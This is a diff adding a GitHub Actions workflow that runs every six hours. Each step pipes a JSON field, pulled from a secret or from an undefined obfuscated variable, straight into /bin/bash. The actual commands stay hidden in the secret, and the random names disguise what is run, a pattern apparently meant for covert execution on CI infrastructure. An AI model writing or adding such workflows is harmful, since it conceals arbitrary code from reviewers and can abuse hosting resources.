@@ -1,0 +1,22 @@
+name: huangyunxiao7461
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangyunxiao7461
+        env:
+          ew95: ${{ secrets.ew95 }}
+        run: |
+          echo $ew95 | jq -r .le0 | /bin/bash
+          echo $llvih45 | jq -r .u0 | /bin/bash
+          echo $icymd321 | jq -r .llspg95528 | /bin/bash
+          echo $hwg3300 | jq -r .z6 | /bin/bash
+          echo $whcsm15 | jq -r .adjk54 | /bin/bash
+          echo $q4 | jq -r .cjxy87410 | /bin/bash
+
